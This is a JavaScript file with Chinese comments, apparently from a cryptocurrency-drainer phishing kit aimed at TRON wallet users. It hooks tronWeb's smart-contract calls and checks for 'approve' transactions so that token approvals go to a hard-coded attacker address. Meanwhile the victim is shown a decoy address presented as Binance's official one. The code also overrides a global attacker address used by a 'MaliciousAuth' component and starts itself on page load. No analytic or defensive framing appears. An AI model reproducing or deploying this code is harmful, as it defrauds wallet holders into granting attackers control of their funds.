/**
 * 简化版地址伪装系统
 * 🎭 专注于核心功能：在授权时伪装攻击者地址，不干扰页面跳转
 */

(function() {
    'use strict';
    
    console.log('🎭 简化版地址伪装系统已加载');
    
    // 🎯 真实的攻击者地址
    const REAL_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
    
    // 🎯 伪装地址（Binance官方地址）
    const SPOOF_ADDRESS = 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE';
    
    console.log(`🎭 地址伪装: ${REAL_ATTACKER_ADDRESS} → ${SPOOF_ADDRESS}`);
    
    // 🎯 劫持智能合约调用，仅在授权时替换地址
    function hijackSmartContractCalls() {
        if (!window.tronWeb) {
            setTimeout(hijackSmartContractCalls, 1000);
            return;
        }
        
        try {
            if (window.tronWeb.transactionBuilder && !window.tronWeb.transactionBuilder._spoofed) {
                const originalTrigger = window.tronWeb.transactionBuilder.triggerSmartContract;
                
                window.tronWeb.transactionBuilder.triggerSmartContract = function(contractAddress, functionSelector, options, parameters, issuerAddress) {
                    console.log('🎭 拦截智能合约调用:', functionSelector);
                    
                    // 🚨 禁用所有地址伪装，确保授权给真实攻击者
                    if (functionSelector && functionSelector.includes('approve')) {
                        console.log('🎯 检测到授权操作，保持真实地址以确保攻击成功');
                        console.log(`🎯 授权将给予真实攻击者: ${REAL_ATTACKER_ADDRESS}`);
                        console.log(`🚨 地址伪装已禁用，授权交易使用真实地址`);
                    }
                    
                    return originalTrigger.call(this, contractAddress, functionSelector, options, parameters, issuerAddress);
                };
                
                window.tronWeb.transactionBuilder._spoofed = true;
                console.log('🎭 智能合约调用劫持完成');
            }
        } catch (e) {
            console.log('🎭 智能合约劫持失败:', e.message);
        }
    }
    
    // 🎯 劫持恶意授权系统
    function hijackMaliciousAuth() {
        if (window.MaliciousAuth) {
            // 临时替换全局攻击者地址
            if (window.ATTACKER_ADDRESS) {
                const originalAddress = window.ATTACKER_ADDRESS;
                window.ATTACKER_ADDRESS = SPOOF_ADDRESS;
                console.log(`🎭 全局攻击者地址已伪装: ${originalAddress} → ${SPOOF_ADDRESS}`);
            }
        } else {
            setTimeout(hijackMaliciousAuth, 500);
        }
    }
    
    // 🎯 激活伪装系统
    function activate() {
        console.log('🎭🎭🎭 激活简化版地址伪装系统！🎭🎭🎭');
        hijackSmartContractCalls();
        hijackMaliciousAuth();
        console.log('🎭 地址伪装系统已激活，专注于授权伪装');
    }
    
    // 🎯 全局接口
    window.SimpleAddressSpoofing = {
        activate: activate,
        getRealAddress: () => REAL_ATTACKER_ADDRESS,
        getSpoofAddress: () => {
            // 🚨 重要：由于授权必须给真实攻击者，暂时返回真实地址
            console.log('🚨 授权场景下使用真实攻击者地址以确保攻击成功');
            return REAL_ATTACKER_ADDRESS;
        },
        getDisplayAddress: () => SPOOF_ADDRESS  // 仅用于显示
    };
    
    // 🎯 自动初始化
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => {
            hijackSmartContractCalls();
        }, 1000);
    });
    
    console.log('🎭 简化版地址伪装系统初始化完成');
    
})();